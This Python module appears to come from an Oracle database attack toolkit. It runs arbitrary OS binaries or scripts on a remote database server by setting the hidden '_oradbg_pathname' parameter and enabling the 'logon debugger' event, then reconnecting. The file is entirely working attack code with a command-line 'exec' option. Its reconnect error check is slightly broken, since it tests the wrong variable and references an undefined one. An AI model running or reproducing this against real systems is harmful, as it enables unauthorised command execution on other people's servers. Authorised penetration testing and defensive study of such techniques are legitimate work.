#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
import logging, cx_Oracle
from Utils import ErrorSQLRequest, checkOptionsGivenByTheUser
from Constants import *

class Oradbg (OracleDatabase):
	'''
	Allow the user to execute a binary stored on the server
	'''
	def __init__(self,args):
		'''
		Constructor
		'''
		logging.debug("Oradbg object created")
		OracleDatabase.__init__(self,args)

	def execOSCommand(self,cmd):
		'''
		Execute a binary or script stored on the server
		'''
		logging.info('Execute the following command on the remote database system: {0}'.format(cmd))
		logging.info('Be Careful: script or bin without special chars is allowed')
		logging.debug('Setting the _oradbg_pathname variable to {0}'.format(cmd))
		REQUEST = "alter system set \"_oradbg_pathname\"='{0}'".format(cmd)
		response = self.__execPLSQL__(REQUEST)
		if isinstance(response,Exception):
			logging.info("Impossible to set _oradbg_pathname: '{0}'".format(self.cleanError(response)))
			return response
		else:
			logging.debug('Setting the system set events')
			REQUEST = "alter system set events 'logon debugger'"
			response = self.__execPLSQL__(REQUEST)
			if isinstance(response,Exception):
				logging.info('Impossible to set system events: {0}'.format(self.cleanError(response)))
				return response
			else :
				logging.debug('Connecting to the database to run the script/bin')
				status = self.connection(threaded=False, stopIfError=False)
				if isinstance(response,Exception):
					return ErrorSQLRequest("Impossible to connect to the remmote database to run the bin/script: {0}".format(self.cleanError(e)))
				return True

	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("Oradbg ?")
		command = self.__generateRandomString__()
		logging.info("Try to use _oradbg_pathname variable to execute the following random command: {0}".format(command))
		status = self.execOSCommand(cmd=command)
		if status == True :
			self.args['print'].goodNews("OK")
		else : 
			self.args['print'].badNews("KO")


def runOradbgModule(args):
	'''
	Run the Oradbg module
	'''
	status = True
	if checkOptionsGivenByTheUser(args,["test-module","exec"]) == False : return EXIT_MISS_ARGUMENT
	oradbg = Oradbg(args)
	status = oradbg.connection(stopIfError=True)
	if args['test-module'] == True :
		args['print'].title("Test if the Oradbg can be used")
		status = oradbg.testAll()
	#Option 1: exec
	if args['exec'] != None:
		args['print'].title("Execute the `{0}` on the {1} server".format(args['exec'],args['server']))
		status = oradbg.execOSCommand(args['exec'])
		if status == True:
			args['print'].goodNews("The `{0}` command was executed on the {1} server (probably)".format(args['exec'],args['server']))
		else :
			args['print'].badNews("The `{0}` command was not executed on the {1} server: {2}".format(args['exec'],args['server'],str(status)))
	oradbg.close()






